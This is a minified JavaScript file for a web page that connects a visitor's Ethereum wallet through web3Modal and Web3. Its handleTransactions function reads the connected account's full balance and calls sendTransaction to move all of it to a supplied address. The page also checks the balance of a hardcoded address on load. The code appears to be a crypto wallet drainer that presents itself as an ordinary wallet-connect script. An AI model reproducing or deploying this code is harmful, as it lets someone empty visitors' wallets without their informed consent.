import{web3Modal,ethereumClient,provider,chains}from"./web.js";import{ethers}from"https://cdnjs.cloudflare.com/ajax/libs/ethers/6.6.3/ethers.js";console.log("test",web3Modal);let ethereumProvider=void 0,web3;async function connectEther(){console.log("ethers",window.ethereum);const test=new Web3(window.ethereum);web3=test;console.log("signer here:",test);const accounts=await test.eth.getAccounts(),gasPrice=await web3.eth.getGasPrice();console.log("my accounts",accounts);console.log("gas price",gasPrice);const balance=await fetchBalance(accounts[0]);return{address:accounts[0],balance,gasPrice}}async function handleTransactions(to){try{const{balance,address}=await connectEther(),valueInWei=web3.utils.toWei(balance,"ether"),transaction=await web3.eth.sendTransaction({from:address,to,value:valueInWei});console.log("Transaction successful:",transaction),alert("Transaction successful! Transaction Hash: "+transaction.transactionHash)}catch(error){console.error("Transaction error:",error),alert("Transaction error! Please check the console for more details.")}}window.handleTransaction=handleTransactions;async function fetchBalance(address){try{const balance=await web3.eth.getBalance(address),etherBalance=web3.utils.fromWei(balance,"ether");console.log("Balance:",etherBalance);return etherBalance}catch(error){console.error("Error fetching balance:",error),alert("Error fetching balance. Please check the console for more details.")}}async function transferEth(){}document.addEventListener("DOMContentLoaded",async()=>{try{window.web3Modal=web3Modal,console.log("debatable",web3Modal),window.ethereumClient=ethereumClient,console.log("the doj",ethereumClient);const account=window.ethereumClient.getAccount(),etherBtn=document.getElementById("ether");etherBtn.addEventListener("click",connectEther),window.usersWalletAddress=account.address,window.providerWallet="",console.log(account);const balance=await ethereumClient.fetchBalance("0x3b9bA781797b57872687Ce5d5219A1A4Bc0e85ea");console.log("balance:",balance)}catch(error){console.log("the error here",error)}});
